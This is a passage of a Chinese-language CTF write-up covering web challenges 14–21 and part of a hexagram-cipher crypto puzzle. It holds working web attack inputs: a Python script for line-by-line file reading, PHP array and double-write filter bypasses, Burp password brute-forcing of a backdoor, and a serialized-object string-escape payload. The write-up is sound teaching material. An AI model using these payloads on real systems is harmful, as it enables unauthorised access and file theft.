cookies欺骗</p></blockquote><p>进入题目之后我们可以看到这个题目的url</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.67.175.224:13933&#x2F;index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将a2V5cy50eHQ这个明显是Base64编码，进行解码知道是keys.txt，虽然不知道这个key.txt里面是什么，先复制出来。尝试用修改参数filename的值为index.php ,这个时候我们什么都看不到，</p><p>写一个脚本查下源代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsa<span class="token operator">=</span><span class="token number">30</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">"http://114.67.175.224:13933/index.php?line="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&amp;filename=aW5kZXgucGhw"</span>    s<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来就是，分析源码了，这就进入了php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$line</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                 <span class="token string single-quoted-string">'0'</span> <span class="token operator">=></span><span class="token string single-quoted-string">'keys.txt'</span><span class="token punctuation">,</span>                 <span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">,</span>             <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'keys.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$fa</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$fa</span><span class="token punctuation">[</span><span class="token variable">$line</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>hackbar</strong>里面就有cookie，虽然这个是在火狐里，直接开火狐，传一个margin=margin出去。查看源代码得到flag</p><h3 id="15-各种绕过哟">15 各种绕过哟</h3><p>这个还是属于php特性吧，sha()函数无法处理数组，这里我们可以直接构造数组，传进去就能得到flag…</p><pre class="line-numbers language-none"><code class="language-none">get:?uname[]&#x3D;1&amp;id&#x3D;marginpost:passwd[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="16-备份是个好习惯">16 备份是个好习惯</h3><p>备份啊,估计bak文件吧…</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"取得flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>果然不是个签到啊，这样的话又回到了PHP特性的处理，还是可以通过数组进行绕过就能得到flag。</p><p>一开始没注意到过滤了key，这里可以使用双写绕过就是kekeyy在key被第一重的str_replace过滤之后我们仍然可以通过ke和y的拼接得到需要的key。</p><h3 id="17-网站被黑">17 网站被黑</h3><p>先拿御剑扫描下后台，发现一个shell.php的页面进去，就是后门…没有其他提示了，到这里应该就说明了是需要用burp爆破密码了，直接在火狐里打开挂代理，抓包爆破一气呵成，找到了hack这个长度与其他的返回不同</p><p>输进去看下得到flag</p><h3 id="18-字符？正则？">18 字符？正则？</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag&#123;********************************&#125;'</span><span class="token punctuation">;</span><span class="token variable">$IM</span><span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span><span class="token punctuation">,</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$IM</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key is: '</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>1.表达式直接写出来的字符串直接利用，如key<br>2.“.”代表任意字符<br>3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次<br>4.“/”代表“/”<br>5.[a-z]代表a-z中的任意一个字符<br>6.[[:punct:]]代表任意一个字符，包括各种符号<br>7./i代表大小写不敏感<br>8.{4-7}代表[0-9]中数字连续出现的次数是4-7次</p></blockquote><p>好了这样就可以构造了</p><pre class="line-numbers language-none"><code class="language-none">key@keykeykeykeykey:\\\\1keya@<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="19-bp">19 BP</h3><blockquote><p>弱密码top1000？z???</p></blockquote><p>top1000的弱密码而且是以z开头的，这连burp都不用开了啊，开burp还需要时间，用Excel筛选，得出只有几个符合条件的密码，输入即可</p><h3 id="20-newphp">20 newPHP</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// php版本:5.4.44</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$hint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token operator">===</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">)</span>            @<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"╭(●｀∀´●)╯"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//There's a hint in ./hint.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"╰(●’◡’●)╮"</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/is'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NoNoNo!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emmmmm…这道题考察的应该是php反序列化？</p><blockquote><p>php var_dump 函数作用是判断一个变量的类型与长度,并输出变量的数值,如果变量有值，输出的是变量的值并回返数据类型.</p></blockquote><p><strong>15:13用时33min…</strong></p><p>在第一个类eval()里面有一个php强比较hint===“hint.php”，这里hint.php也就是我们需要构造的</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是post进去<code>username</code>和<code>password</code>两个参数，然后触发的是User类，但是有个read和write方法，经过处理后才进行序列化</p><p>然后看这两个函数，write和read两个函数，read()函数中将’\0\0\0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。 也就是php字符串逃逸导致的漏洞，即序列化的字符串在经过过滤函数不正确的处理而导致对象注入</p><p>构造ployed：username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a&quot;;s:8:“password”;O:4:“evil”:2:{s:4:“hint”;s:8:“hint.php”;}</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>令username= \0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</p><p>在write函数在\0的数目成功翻倍，进入read()函数从\0开始到&amp;password=a&quot;;s:8:“password”;进入user类的构造，而O:4:“evil”:2:{s:4:“hint”;s:8:“hint.php”;}则成功逃逸，</p><p>这里还有个__wakeup()将在序列化之后立即被调用， wakeup()函数的漏洞利用…</p><p>将得到的hint串进行解码，得到新一段php代码，直接访问index.CGI</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.cgi"</span><span class="token punctuation">;</span> <span class="token comment">// You can't see me~</span><span class="token operator">?</span>php<span class="token operator">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>从url可以看出get,使用file协议从本地读取flag即可。</p><h3 id="21-道友不来算一算凶吉？">21 道友不来算一算凶吉？</h3><blockquote><p>半仙我夜观天象，掐指一算，卜出卦象如下，不知道的有无道友可解此卦。</p><p>密文:升益艮归妹井萃旅离旅困未济屯未济中孚未济升困噬嗑鼎震巽噬嗑解节井萃离未济蒙归妹大畜无妄解兑临睽升睽未济无妄遁涣归妹</p><p>嗯？为什么还有a和b呢?<br>a=5，b=7</p></blockquote><p>这是一道标着密码学的杂项…八卦通过两两组合一共有64种卦象，在题目附件里有一个python代码，应该是作为加密使用的，我们要做的是根据这个找到解密方式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">def</span> <span class="token function">encrpyt5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        enc<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp<span class="token operator">=</span><span class="token string">''</span>    offset<span class="token operator">=</span><span class="token number">5</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>offset<span class="token operator">-</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就基本跟当时那个一样了…还真就是BUJCTF2020那个密码学…</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">'升益艮归妹井萃旅离旅困未济屯未济中孚未济升困噬嗑鼎震巽噬嗑解节井萃离未济蒙归妹大畜无妄解兑临睽升睽未济无妄遁涣归妹'</span>dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span><span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token 